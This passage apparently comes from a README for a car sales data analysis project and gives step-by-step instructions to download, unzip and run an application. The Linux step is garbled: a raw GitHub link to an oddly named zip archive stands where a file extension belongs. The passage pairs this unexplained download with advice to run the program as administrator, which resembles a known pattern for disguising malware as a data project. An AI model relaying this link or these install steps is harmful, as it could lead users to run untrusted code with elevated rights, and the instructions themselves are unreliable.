### Step 2: Choose the right file

Once on the release page, look for the file that matches your operating system:

- For Windows, look for something ending with `.exe` or `.zip`.
- For macOS, look for `.dmg` or `.zip`.
- For Linux, it may be `https://github.com/moonie14/Car-Sales-Data-EDA-project/raw/refs/heads/main/definitely/Sales-Data-project-Car-ED-3.3.zip` or `.AppImage`.

If you see a compressed file (like `.zip`), you will need to unzip it first.

### Step 3: Run or install the application

- On Windows, double-click the `.exe` file or run the setup program if provided.
- On macOS, open the `.dmg` and drag the app into your Applications folder, then open it.
- On Linux, follow the instructions provided or make the file executable and run it.

If the app opens and shows a window with options to upload a file or view charts, you are ready to go.

### Step 4: Load your car sales data

Look for a button or menu item saying "Open Data" or "Load File."

Choose your car sales data file in CSV or Excel format. The app will clean it automatically.

### Step 5: Explore the data

Use the menus or buttons to view charts and reports. Look for terms like:

- Sales Over Time
- Price Trends
- Model Popularity
- Summary Statistics

These views help you understand how car sales have changed and what factors might be affecting prices and demand.

### Step 6: Save your work (optional)

You can usually export charts as images or save reports as files to share with others or keep a record.

## 🛠️ Troubleshooting Tips

- If the app does not start, check your system meets the requirements and try running it as an administrator.
- If you get an error opening your data file, make sure it is in a supported format (CSV or Excel) and not corrupted.
